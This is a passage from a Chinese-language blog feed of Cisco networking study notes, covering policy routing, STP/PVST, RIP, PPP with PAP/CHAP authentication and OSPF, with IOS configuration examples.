172.16.21.2</p><p><code>应用路由映射表</code></p><p>R1(config)#int f0/0</p><p>R1(config-if)#ip policy route-map CCIE</p><p>R1(config)#ip local policy route-map CCIE</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;策略路由：&quot;&gt;&lt;a href=&quot;#策略路由：&quot; class=&quot;headerlink&quot; title=&quot;策略路由：&quot;&gt;&lt;/a&gt;策略路由：&lt;/h1&gt;&lt;p&gt;策略路由提供了一种根据网络管理者制定的策略来进行数据包转发的机制。基于策略的路由比传统路由能力更强，使用更灵活，它使
      
    
    </summary>
    
      <category term="系统安全" scheme="http://yoursite.com/categories/%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="网络设计及扩展" scheme="http://yoursite.com/tags/%E7%BD%91%E7%BB%9C%E8%AE%BE%E8%AE%A1%E5%8F%8A%E6%89%A9%E5%B1%95/"/>
    
      <category term="网络协议" scheme="http://yoursite.com/tags/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/"/>
    
  </entry>
  
  <entry>
    <title>STP生成树协议</title>
    <link href="http://yoursite.com/2019/09/23/STP%E7%94%9F%E6%88%90%E6%A0%91%E5%8F%8APVST/"/>
    <id>http://yoursite.com/2019/09/23/STP生成树及PVST/</id>
    <published>2019-09-23T02:59:03.548Z</published>
    <updated>2019-08-25T13:03:33.676Z</updated>
    
    <content type="html"><![CDATA[<h1 id="STP生成树协议介绍："><a href="#STP生成树协议介绍：" class="headerlink" title="STP生成树协议介绍："></a>STP生成树协议介绍：</h1><p><strong>交换机工作原理：</strong>根据MAC地址表转发数据帧，如果地址未知，则广播</p><p><strong>广播风暴的产生：</strong>当网络中存在物理环路，会产生广播风暴。</p><h3 id="STP生成树协议："><a href="#STP生成树协议：" class="headerlink" title="STP生成树协议："></a>STP生成树协议：</h3><p>当链路存在环路时，它会在逻辑上断开环路，防止广播风暴的产生。当线路出现故障，断开的接口被激活，恢复通信，充当备份线路的作用。</p><p><strong>STP算法：</strong></p><p>​    STP将一个环形网络生成无环拓扑的步骤：</p><p>​            第一步：选择根网桥（Root Bridge）</p><p>​            第二步：选择根端口（Root Ports）</p><p>​            第三步：选择指定端口（Designated Ports）</p><hr><p><strong>选择根网桥（Root Bridge）</strong></p><p>​    （1）如何选择根网桥</p><p>​            根据网桥ID（BID）选择根网桥，谁的优先级小，谁就是根网桥。如果优先级相同，谁的MAC地址小谁就是根网桥</p><p>​    （2）什么是网桥ID（BID）</p><p>​            每个网络只能有一个根桥，根桥具有最低的桥ID，根桥上的所有端口都是指定端口，选择根网桥的目的是为了给将生成的树形结构确定一个树根</p><p>​    （3）实例</p><p>​            <img src="http://ww1.sinaimg.cn/large/006bOYmUgy1g6ah3tpb30j30dx08eaab.jpg" alt></p><hr><p><strong>选择根端口（Root Ports）</strong></p><p>​    （1）如何选择根端口</p><p>​            在非根网桥上选择一个到根网桥最近的端口作为根端口，选择依据是：</p><p>​            根路径成本（cost值）最低</p><p>​            直连网桥的网桥ID最小</p><p>​            直连网桥的端口ID最小</p><p>​    （2）什么是cost值</p><p>​            cost值是根路径成本，是网桥到根网桥的路径上所有链路的成本之和</p><p><img src="http://ww1.sinaimg.cn/large/006bOYmUgy1g6ah9xhqx1j30is04pwel.jpg" alt></p><p>​            根路径成本表：</p><p><img src="http://ww1.sinaimg.cn/large/006bOYmUgy1g6ahb0062oj30lu05mglk.jpg" alt></p><p>​    （3）什么是端口ID</p><p>​            <img src="http://ww1.sinaimg.cn/large/006bOYmUgy1g6ahc78q6ij30c905ojr9.jpg" alt></p><p>​    （4）实例</p><p><img src="http://ww1.sinaimg.cn/large/006bOYmUgy1g6ahe9hjkmj30it09274w.jpg" alt></p><hr><p><strong>选择指定端口（Designated Ports）</strong></p><p>​    （1）选择指定端口依据</p><p>​            在每个网段上，选择1个指定端口，根桥上的端口全是指定端口。</p><p>​            非根桥上的指定端口：</p><p>​                    根路径成本【从非根桥到根桥】最低</p><p>​                    端口所在的网桥的ID值较小</p><p>​                    直连网桥的端口ID值较小</p><h3 id="生成树端口状态："><a href="#生成树端口状态：" class="headerlink" title="生成树端口状态："></a>生成树端口状态：</h3><p><img src="http://ww1.sinaimg.cn/large/006bOYmUgy1g6c7kr2izhj30nn07tglt.jpg" alt></p><h3 id="生成树计数器："><a href="#生成树计数器：" class="headerlink" title="生成树计数器："></a>生成树计数器：</h3><p>交换机开机需要等待30秒时间开始转发数据，当某个正在使用的链路断掉。阻塞的端口需要50秒时间开始转发数据</p><p><img src="http://ww1.sinaimg.cn/large/006bOYmUgy1g6c7mw95vkj30e7078t8m.jpg" alt></p><hr><h1 id="BPDU（桥协议数据单元）："><a href="#BPDU（桥协议数据单元）：" class="headerlink" title="BPDU（桥协议数据单元）："></a>BPDU（桥协议数据单元）：</h1><p>交换机怎么知道其他交换机的网桥ID？怎么知道哪个端口的根路径成本最小？</p><p>是因为交换机之间使用BPDU来交换STP信息，BPDU（Bridge Protocol Data Unit）使用组播发送BPDU，组播地址为：01-80-c2-00-00-00。</p><p>BPDU分为2种类型：</p><p>​    配置BPDU － 用于生成树计算</p><p>​    拓朴变更通告（TCN）BPDU － 用于通告网络拓朴的变化</p><p><img src="http://ww1.sinaimg.cn/large/006bOYmUgy1g6aho529ggj30hz0dbaae.jpg" alt></p><hr><h3 id="STP使用BPDU选择根网桥："><a href="#STP使用BPDU选择根网桥：" class="headerlink" title="STP使用BPDU选择根网桥："></a><strong>STP使用BPDU选择根网桥：</strong></h3><p>（1）交换机启动时，假定自己是根网桥，在外发送的BPDU中，根网桥ID字段填写自己的网桥ID</p><p><img src="http://ww1.sinaimg.cn/large/006bOYmUgy1g6c7eddlvaj30kr08274v.jpg" alt></p><p>（2）当接收到其他交换机发出的BPDU后，比较网桥ID，选择较小的添加到根网桥ID中</p><p><img src="http://ww1.sinaimg.cn/large/006bOYmUgy1g6c7epn3noj30ls08caao.jpg" alt></p><hr><h3 id="STP使用BPDU计算根路径成本："><a href="#STP使用BPDU计算根路径成本：" class="headerlink" title="STP使用BPDU计算根路径成本："></a>STP使用BPDU计算根路径成本：</h3><p>（1）根网桥发送根路径成本为0的BPDU</p><p><img src="http://ww1.sinaimg.cn/large/006bOYmUgy1g6c7iyuqcxj30n308swfr.jpg" alt></p><p>（2）其他交换机收到根网桥的BPDU后，在根路径成本上添加接收接口的路径成本，然后转发</p><p><img src="http://ww1.sinaimg.cn/large/006bOYmUgy1g6c7j8u3rlj30kx08k0ty.jpg" alt></p><hr><h1 id="PVST（VLAN生成树）："><a href="#PVST（VLAN生成树）：" class="headerlink" title="PVST（VLAN生成树）："></a>PVST（VLAN生成树）：</h1><p>PVST是Cisco私有，为每个VLAN构造一颗生成树的生成树协议</p><p>PVST在实际中，配置网络中比较稳定的交换机为根网桥，利用PVST实现网络的负载均衡</p><h3 id="PVST配置命令："><a href="#PVST配置命令：" class="headerlink" title="PVST配置命令："></a>PVST配置命令：</h3><p>⚪启用生成树：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Switch(config)#spanning-tree vlan 10</span><br></pre></td></tr></table></figure><p>⚪设置根网桥：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Switch(config)#spanning-tree vlan 10 root primary/secondary</span><br></pre></td></tr></table></figure><p><code>-设置primary后，优先级变为24576，为主根桥</code></p><p><code>-设置secondary后，优先级变成28672，为次根桥</code></p><p>⚪修改网桥的优先级：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Switch(config)#spanning-tree vlan 10 priority Bridge-priority</span><br></pre></td></tr></table></figure><p><code>-优先级的值为4096的倍数</code></p><p>⚪修改端口成本:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Switch(config-if)#spanning-tree vlan 10 cost cost</span><br></pre></td></tr></table></figure><p>⚪修改端口优先级:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Switch(config-if)#spanning-tree vlan 10 port-priority priority</span><br></pre></td></tr></table></figure><p>⚪配置上行速链路:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Switch(config)#spanning-tree uplinkfast</span><br></pre></td></tr></table></figure><p>⚪配置端口速链路：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Switch(config-if)#spanning-tree portfast</span><br></pre></td></tr></table></figure><p>⚪查看生成树的配置：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Switch#show spanning-tree</span><br></pre></td></tr></table></figure><p>⚪查看某个VLAN的生成树详细信息：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Switch#show spanning-tree vlan 10 detail</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;STP生成树协议介绍：&quot;&gt;&lt;a href=&quot;#STP生成树协议介绍：&quot; class=&quot;headerlink&quot; title=&quot;STP生成树协议介绍：&quot;&gt;&lt;/a&gt;STP生成树协议介绍：&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;交换机工作原理：&lt;/strong&gt;根据MAC地址表转
      
    
    </summary>
    
      <category term="系统安全" scheme="http://yoursite.com/categories/%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="网络设计及扩展" scheme="http://yoursite.com/tags/%E7%BD%91%E7%BB%9C%E8%AE%BE%E8%AE%A1%E5%8F%8A%E6%89%A9%E5%B1%95/"/>
    
      <category term="网络协议" scheme="http://yoursite.com/tags/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/"/>
    
  </entry>
  
  <entry>
    <title>RIP路由协议</title>
    <link href="http://yoursite.com/2019/09/23/RIP/"/>
    <id>http://yoursite.com/2019/09/23/RIP/</id>
    <published>2019-09-23T02:59:03.546Z</published>
    <updated>2019-08-25T14:17:41.784Z</updated>
    
    <content type="html"><![CDATA[<h1 id="动态路由协议-RIP："><a href="#动态路由协议-RIP：" class="headerlink" title="动态路由协议-RIP："></a>动态路由协议-RIP：</h1><p>路由信息协议RIP（Routing Information Protocol）是基于距离矢量算法的路由协议，利用跳数来作为计量标准。</p><p>距离矢量路由协议是路由器定期将路由表的副本传递给邻居路由器并累计距离矢量。“距离”表示有多远，“矢量”表示在那个方向上</p><p><strong>RIP协议的管理距离为120</strong></p><hr><h3 id="RIP协议的工作原理："><a href="#RIP协议的工作原理：" class="headerlink" title="RIP协议的工作原理："></a>RIP协议的工作原理：</h3><p>路由器开始运行RIP，当路由器的更新周期30秒到了的时候，会向邻居发送路由表。</p><p>Metric：度量值，衡量一条路由好坏的值。发送路由表时Metric值会加1，学习路由时，会学习最佳路由，将Metric值小的路由放到路由表当中。</p><p><strong>RIP协议计数至无穷大的解决方法：</strong>定义最大跳数为15跳</p><p><strong>RIP协议路由环路解决方法：</strong></p><p>​        1、水平分割</p><p>​                -向原始信息的来源方向返回路由信息毫无用处</p><p>​        2、路由毒化和毒性逆转</p><p>​                -当A中的一条路断开后，路由器将已经断开的路由的距离通告为无穷大。并立刻开启触发更新，向B发送更新包。B收到更新包后，将断开的路由标记为“可能已断开”，忽略水平分割，进行毒性逆转，向C发送路由信息，告诉C可能已断开</p><p>​        3、抑制计时器</p><p>​                -路由器为网络中的“可能有故障”状态保留条目，以便为其它路由器重新计算拓扑更改留出时间</p><p>​        4、触发更新</p><p>​                -路由表发生变化时，路由器发送更新</p><hr><h3 id="RIP路由协议的版本："><a href="#RIP路由协议的版本：" class="headerlink" title="RIP路由协议的版本："></a>RIP路由协议的版本：</h3><p><strong>RIP v1：</strong></p><p>发送路由更新时不携带子网掩码，宣告主类网络，属于有类路由协议</p><p>发送路由更新时，目标地址为广播地址：255.255.255.255</p><p><strong>RIP v2：</strong></p><p>发送路由更新时携带子网掩码，属于无类路由协议</p><p>发送路由更新时，目标地址为组播地址：224.0.0.9</p><h3 id="RIP路由协议的配置："><a href="#RIP路由协议的配置：" class="headerlink" title="RIP路由协议的配置："></a>RIP路由协议的配置：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">R2(config)#router rip//进入rip协议配置</span><br><span class="line">R2(config-router)#version 2 //启用rip v2版本</span><br><span class="line">R2(config-router)#no auto-summary//关闭路由自动汇总</span><br><span class="line">R2(config-router)#network 192.168.12.0//通过RIP宣告直连网段</span><br><span class="line">R2(config)#interface f0/1//进入接口</span><br><span class="line">R2(config-if)#ip summary-address rip 172.16.0.0 255.255.252.0//RIP手动路由汇总</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;动态路由协议-RIP：&quot;&gt;&lt;a href=&quot;#动态路由协议-RIP：&quot; class=&quot;headerlink&quot; title=&quot;动态路由协议-RIP：&quot;&gt;&lt;/a&gt;动态路由协议-RIP：&lt;/h1&gt;&lt;p&gt;路由信息协议RIP（Routing Information Prot
      
    
    </summary>
    
      <category term="系统安全" scheme="http://yoursite.com/categories/%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="网络设计及扩展" scheme="http://yoursite.com/tags/%E7%BD%91%E7%BB%9C%E8%AE%BE%E8%AE%A1%E5%8F%8A%E6%89%A9%E5%B1%95/"/>
    
      <category term="路由协议" scheme="http://yoursite.com/tags/%E8%B7%AF%E7%94%B1%E5%8D%8F%E8%AE%AE/"/>
    
  </entry>
  
  <entry>
    <title>PPP协议</title>
    <link href="http://yoursite.com/2019/09/23/PPP/"/>
    <id>http://yoursite.com/2019/09/23/PPP/</id>
    <published>2019-09-23T02:59:03.541Z</published>
    <updated>2019-09-22T02:45:02.291Z</updated>
    
    <content type="html"><![CDATA[<h1 id="PPP协议："><a href="#PPP协议：" class="headerlink" title="PPP协议："></a>PPP协议：</h1><p>PPP是一种基于ISO的高级数据链路控制（ISO-HDLC）的WAN协议，工作在物理层和数据链接层。PPP基于开放式标准，并包括各种功能，这使它成为拨号连接和与用WAN连接的事实标准。能够控制数据链路的建立，能够对广域网的IP地址迚行分配和管理，允许同时采用多种网络层路由协议，能够配置和测试数据链路，能够有效进行错误检测。不与SLIP类似，PPP经常也是用于低速的串行链路，PPP优于HDLC的特点在于有认证机制，可以保证数据传输的安全性。</p><p><strong>PPP的优点：</strong></p><p>1、PPP支持在单根串行链路上运行多种协议，不只是IP协议</p><p>2、每一帧都有循环冗余检验</p><p>3、通信双方可以进行IP地址的动态协商（使用IP NCP）</p><p>4、不CSLIP类似，对TCP和IP报文首部进行压缩</p><p><strong>PPP包括以下三个部分：</strong></p><p>1、在串行链路上封装IP数据报的方法。PPP既支持数据为8位和无奇偶检验的异步模式（如大多数计算机上普遍存在的串行接口），还支持面向比特的同步链接</p><p>2、建立、配置和测试数据链路的链路控制协议（LCP：Link  Control Protocol）它允许通信双方进行协商，以确定不同的选项。负责对L1的物理层的链路，进行链路的建立、控制、维护</p><p>3、针对不同网络层协议的网络控制协议（NCP：Network   ControlProtocol）（IPCP＋CDPCP）体系。负责对L3的网络层，向下提供无差别的接口.负责建立和配置各种网络层协议 .当前RFC定义的网络层有IP、OSI网络层、DECnet以及AppleTalk。</p><p><strong>PPP的帧格式：</strong></p><p>PPP的帧格式在ISO标准的帧格式的基础上新增了两个字段</p><p>1、协议字段：指出第3层协议（如IP戒IPX）</p><p>2、LCP字段：使得PPP的功能得以实现。</p><p>每个帧都以标志字符0x7e开始和结束。PPP帧的前3个字段和最后两个字段不HDLC的格式是一样的。PPP协议不是面向比特的，因而所有的PPP帧长度都是整数个字节。</p><p>地址字段：值始终是0xff</p><p>控制字段：值为0x03</p><p>协议字段：</p><p>​                    0x0021–信息字段是IP数据报</p><p>​                    0xC021–信息字段是链路控制数据LCP</p><p>​                    0x8021–信息字段是网络控制数据NCP</p><p>​                    0xC023–信息字段是安全性认证PAP</p><p>​                    0xC223–信息字段是安全性认证CHAP</p><p>当信息字段中出现和标志字段一样的比特0x7E时，就必须采叏一些措施。因PPP协议是面向字符型的，所以它不能采用HDLC所使用的零比特插入法，而是使用一种特殊的字符填充。具体的做法是将信息字段中出现的每一个0x7E字节转发成2字节序列（0x7D，0x5E）。若信息字段中出现一个0x7D的字节，则将其转发成2字节序列（0x7D，0x5D）。若<br>信息字段中出现ASCII码的控制字符，则在该字符前面要加入一个0x7D字节。这样做的目的是防止这些表面上的ASCII码控制字符被错误地解释为控制字符。CRC字段：即FCS，帧检验序列。是一个循环冗余检验码，以检测数据帧中的错误。</p><p><strong>PPP的协商过程：</strong></p><p>1、Interface Serial0, changed<br>state to up (L1 up)；</p><p>2、LCP: State is Open  ；</p><p>3、PPP的认证（这是可选项目，如果进行认证，就必须成功，才有NCP的工作）；</p><p>4-1、se1 IPCP: State is Open (IP)；</p><p>4-2、se1 CDPCP: State is Open (cdp：show cdp neighbor)；</p><p>5：Line protocol on interface serial1,changed state to<br>up (L2up)。</p><p><strong>LCP包含了4大网络模块：</strong></p><p>1、认证（authentication:PAP/CHAP）</p><p>2、压缩（compress）</p><p>3、回拨（callback）</p><p>4、多链路捆绑（mulit-link）</p><p>如果一个接口上有peer neighbor-route，那么这台设备就会自动学习到对端接口的32位主机路由。</p><h1 id="PPP的认证和配置方式："><a href="#PPP的认证和配置方式：" class="headerlink" title="PPP的认证和配置方式："></a>PPP的认证和配置方式：</h1><p><strong>PAP认证：</strong></p><p>由被认证方发起，发送主认证方所配置的用户名和密码，并且是明文方式。<br>主认证方检查被认证方发来的用户名及密码看与自己配置的本地用户名和密码是否匹配<br>。</p><p><strong>CHAP认证：</strong></p><p>由主认证方主动发起，并且不会发送密码（这个用户名和密码是主认证端和被认证端都配置好的），而是发送一个随机数值。<br>被认证方收到主认证端发来的随机数值后，将随机数与密码进行hash加密运算，将运算出的值连同自己配置的用户名一起发送给主认证端，主认证端收到被认证端发来的用户名和hash值后，根据被认证端发来的用户名，查找自己本地用户数据库中相同的用户名及对应的密码，并将这个用户名对应的密码与自己发送给被认证端的随机数值也进行hash算法加密，将得出的hash值与被认证端发来的hash值进行比较，如果两端hash一致则表示认证成功，这样就避免了在网络中传输密码，提高安全性。</p><hr><p><strong>PAP认证配置方式：</strong></p><p>主认证端配置：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">R2(config)#interface s3/0</span><br><span class="line">R2(config)#ip address 192.168.1.2 255.255.255.0</span><br><span class="line">R2(config-if)#encapsulation ppp//封装ppp协议</span><br><span class="line">R2(config-if)#ppp authentication pap //启用pap认证</span><br><span class="line">R2(config-if)#peer default ip address pool pap-pool //创建名为pap-pool的地址池</span><br><span class="line">R2(config)#ip local pool pap-pool 192.168.1.10 192.168.1.20 //定义pap-pool池分配的地址范围</span><br><span class="line">R2(config)#username ccie password cisco //创建本地用户名和密码用于pap认证</span><br></pre></td></tr></table></figure><p>被认证端配置：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">R1(config-if)#encapsulation ppp //封装ppp协议</span><br><span class="line">R1(config-if)#ppp pap sent-username ccie password  cisco //设置发送的ppp认证的用户名和密码</span><br><span class="line">R1(config-if)#ip negotiated//开启ip地址协商获取</span><br><span class="line">R1(config-if)#peer neighbor-route//学习对端接口的32位主机路由</span><br><span class="line">R1#show ip intface brief 查看S3/0接口是否获取到了ip地址</span><br></pre></td></tr></table></figure><hr><p><strong>CHAP认证配置方式：</strong></p><p>主认证端配置：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">R2(config)#interface s3/0</span><br><span class="line">R2(config-if)#ip address 192.168.1.2 255.255.255.0</span><br><span class="line">R2(config-if)#peer default ip address pool chap-pool//定义chap-pool地址池的地址范围</span><br><span class="line">R2(config-if)#encapsulation ppp//封装PPP协议</span><br><span class="line">R2(config-if)#ppp authentication chap//启用chap认证</span><br><span class="line">R2(config)#username ccie password cisco//创建chap认证用的本地用户名密码</span><br><span class="line">R2(config)#ip local pool chap-pool 192.168.1.10 192.168.1.20 //定义地址池分配的地址范围</span><br></pre></td></tr></table></figure><p>被认证端配置：</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;PPP协议：&quot;&gt;&lt;a href=&quot;#PPP协议：&quot; class=&quot;headerlink&quot; title=&quot;PPP协议：&quot;&gt;&lt;/a&gt;PPP协议：&lt;/h1&gt;&lt;p&gt;PPP是一种基于ISO的高级数据链路控制（ISO-HDLC）的WAN协议，工作在物理层和数据链接层。PPP基
      
    
    </summary>
    
      <category term="系统安全" scheme="http://yoursite.com/categories/%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="网络设计及扩展" scheme="http://yoursite.com/tags/%E7%BD%91%E7%BB%9C%E8%AE%BE%E8%AE%A1%E5%8F%8A%E6%89%A9%E5%B1%95/"/>
    
      <category term="网络协议" scheme="http://yoursite.com/tags/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/"/>
    
  </entry>
  
  <entry>
    <title>OSPF-开放式最短路径优先协议</title>
    <link href="http://yoursite.com/2019/09/23/OSPF/"/>
    <id>http://yoursite.com/2019/09/23/OSPF/</id>
    <published>2019-09-23T02:59:03.538Z</published>
    <updated>2019-09-17T02:36:44.229Z</updated>
    
    <content type="html"><![CDATA[<h1 id="OSPF概述："><a href="#OSPF概述：" class="headerlink" title="OSPF概述："></a>OSPF概述：</h1><p>OSPF(Open Shortest Path First开放式最短路径优先）是一个内部网关协议(Interior Gateway Protocol，简称IGP），用于在单一自治系统内决策路由。是对链路状态路由协议的一种实现，隶属内部网关协议（IGP），故运作于自治系统内部。著名的迪克斯加算法被用来计算最短路径树。OSPF支持负载均衡和基于服务类型的选路，也支持多种路由形式，如特定主机路由和子网路由等。</p><h3 id="OSPF概述：-1"><a href="#OSPF概述：-1" class="headerlink" title="OSPF概述："></a>OSPF概述：</h3><p>1、通过交换hello数据包来创建邻居关系</p><p>2、以传播LSA代替路由表更新</p><p>3、将LSA泛洪到区域中得所有OSPF路由器，而不仅是直连路由器</p><p>4、收集由OSPF路由器生成的所有LSA以创建OSPF链路状态数据库</p><p>5、使用SPF算法计算到每个目的地的最短距离，并置于路由表中</p><p><strong>链路：</strong>路由器接口</p><p><strong>状态：</strong>描述接口以及它与邻居路由器的关系</p><p>LSA初次泛洪后，链路状态路由器将向所有其他路由器传递由事件触发的较小链路状态更新</p><h3 id="多区域OSPF："><a href="#多区域OSPF：" class="headerlink" title="多区域OSPF："></a>多区域OSPF：</h3><p>在同一个自治系统中，通过接口划分区域，在ABR（区域边界路由器）中划分。</p><p><strong>划分区域的好处：</strong></p><p>1、减少路由表的路由条目</p><p>2、拓朴发生改变时，只影响本区域的数据库</p><p>3、每隔30分钟泛数据库信息（周期和触发更新），划分区域后，只在本区域泛洪</p><p>4、网络设计灵活</p><h3 id="OSPF邻居状态："><a href="#OSPF邻居状态：" class="headerlink" title="OSPF邻居状态："></a>OSPF邻居状态：</h3><hr><p><strong>邻居关系：Hello数据包</strong>  </p><p>可使用命令debug ip ospf adj查看邻居建立的详细过程</p><p><strong>down</strong> 路由器A刚启动时，ospf处于down的状态，因为它还没有与其他路由器交换信息。它使用组播地址224.0.0.5发送hello分组。 </p><p><strong>init</strong>   所有运行ospf的路由器收到A的hello分组时，将A加入邻居列表中，这是init状态。</p><p><strong>2way</strong> 收到A的hello的路由器都向A发送单播应答，A收到后，将这些路由器加入邻居列表，所有路由器都建立了双向关系，进入了2way状态。</p><p><strong>Exstart</strong>  如果链路类型是广播网络（如以太网），接下来必须选举DR和BDR，选举结束后，路由器处于预启动Exstart状态。</p><p><strong>Exchange</strong>  然后交换链路状态数据库摘要，也就是交换DBD，这是Exchange状态。  </p><p><strong>Loading</strong>  DBD交换完毕后进入Loading状态  </p><p><strong>Full</strong> 路由器根据DBD发送LSR请求更新链路状态条目，对方用LSU进行响应。至此，双方都学到了路由条目，database完整，就是Full状态。</p><hr><p><strong>DR/BDR选取：</strong></p><p>（1）在多路访问网络中，DROTHER路由器只与DR与BDR建立邻接关系，DROTHER之间只建邻居关系。</p><p>（2）DR与BDR有自己的组播地址：224.0.0.6</p><p>（3）DR与BDR选取原则，首要因素是时间，其次是接口优先级（多路访问网络的接口优先级为1，点到点网络接口优先级为0。ip ospf priority 可以修改接口优先级，若为0则不参与DR选举，再次是路由器ID：先比环回接口，再比物理接口</p><p>（4）DR与BDR选取是非抢占的，以下情况会重选，重启ospf进程或路由器、参与的路由器都执行clear ip ospf process命令、DR故障、OSPF接口优先级为0。</p><p>（5）如果DR故障，BDR接管DR，如果BDR故障，选新的BDR。</p><h1 id="OSPF配置方法："><a href="#OSPF配置方法：" class="headerlink" title="OSPF配置方法："></a>OSPF配置方法：</h1><h3 id="配置单区域OSPF："><a href="#配置单区域OSPF：" class="headerlink" title="配置单区域OSPF："></a>配置单区域OSPF：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Router（config)#router ospf 1//建立一个OSPF，ID号为1</span><br><span class="line">Router（config-router)#network 192.168.10.0 0.0.0.255 area 0//声明网络，区域为0</span><br></pre></td></tr></table></figure><hr><h3 id="配置OSPF负载均衡："><a href="#配置OSPF负载均衡：" class="headerlink" title="配置OSPF负载均衡："></a>配置OSPF负载均衡：</h3><ul><li><p>路径必须为等价路径</p></li><li><p>默认情况下，最多加入四条等价路由</p></li><li><p>通过更改配置，最多可以配置16条路径</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">R1(config-router)# maximum-paths &lt;value&gt;</span><br></pre></td></tr></table></figure></li><li><p>可更改特殊链路的开销以确保路径等价于负载均衡</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">R1(config-router)# ip ospf &lt;value&gt;</span><br></pre></td></tr></table></figure></li></ul><hr><h3 id="配置OSPF身份验证："><a href="#配置OSPF身份验证：" class="headerlink" title="配置OSPF身份验证："></a>配置OSPF身份验证：</h3><p>1、OSPF身份验证可以基于端口、基于区域、基于链路进行验证</p><p>2、OSPF支持明文和MD5身份验证</p><p>3、路由器生成并检查每个OSPF数据包</p><p>4、路由器验证接收到的每个路由更新数据包的来源</p><p>5、配置“密钥”：每个参与的邻居都必须配置相同的密钥</p><p><strong>配置明文验证：</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">R1(config-if)#ip ospf authentication-key ccie   设置明文密码为ccie，两端密码要一直</span><br><span class="line">R1(config-if)#ip ospf authentication     开启认证</span><br></pre></td></tr></table></figure><p><strong>配置密文验证：</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">R1(config-if)#ip ospf message-digest-key 1 md5 ccie</span><br><span class="line">R1(config-if)#ip ospf authentication</span><br></pre></td></tr></table></figure><p><strong>配置区域认证：</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">R1(config-if)#ip ospf message-digest-key 1 md5 ccie</span><br><span class="line">R1(config-router)#area 1 authentication message-digest</span><br></pre></td></tr></table></figure><hr><h3 id="验证OSPF配置："><a href="#验证OSPF配置：" class="headerlink" title="验证OSPF配置："></a>验证OSPF配置：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">R1#show ip protocols//查看是否配置OSPF</span><br><span class="line">R1#show ip ospf neighbor//查看邻居表</span><br><span class="line">R1#show ip ospf database//查看链路状态数据库</span><br><span class="line">R1#show ip route ospf//查看路由表</span><br><span class="line">R1#show ip ospf//查看OSPF进程及相关信息</span><br><span class="line">R1#show ip ospf f0/0//查看OSPF接口信息</span><br></pre></td></tr></table></figure><hr><h3 id="OSPF路由手工汇总："><a href="#OSPF路由手工汇总：" class="headerlink" title="OSPF路由手工汇总："></a>OSPF路由手工汇总：</h3><p>1、区域间路由汇总必须在ABR上完成</p><p>2、外部路由汇总必须在ASBR上完成</p><p>3、“no-advertise”参数阻止传递汇总路由</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;OSPF概述：&quot;&gt;&lt;a href=&quot;#OSPF概述：&quot; class=&quot;headerlink&quot; title=&quot;OSPF概述：&quot;&gt;&lt;/a&gt;OSPF概述：&lt;/h1&gt;&lt;p&gt;OSPF(Open Shortest Path First开放式最短路径优先）是一个内部网关协议(I
      
    
    </summary>
    
      <category term="系统安全" scheme="http://yoursite.com/categories/%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="网络设计及扩展" scheme="http://yoursite.com/tags/%E7%BD%91%E7%BB%9C%E8%AE%BE%E8%AE%A1%E5%8F%8A%E6%89%A9%E5%B1%95/"/>
    
      <category term="路由协议" scheme="http://yoursite.com/tags/%E8%B7%AF%E7%94%B1%E5%8D%8F%E8%AE%AE/"/>
    
  </entry>
  
  <entry>
    <title>IP地址介绍及VLSM</title>
    <link href="http://yoursite.com/2019/09/23/IP%E5%9C%B0%E5%9D%80%E4%BB%8B%E7%BB%8D%E5%8F%8AVLSM/"/>
    <id>http://yoursite.com/2019/09/23/IP地址介绍及VLSM/</id>
    <published>2019-09-23T02:59:03.535Z</published>
    <updated>2019-08-21T11:11:50.103Z</updated>
    
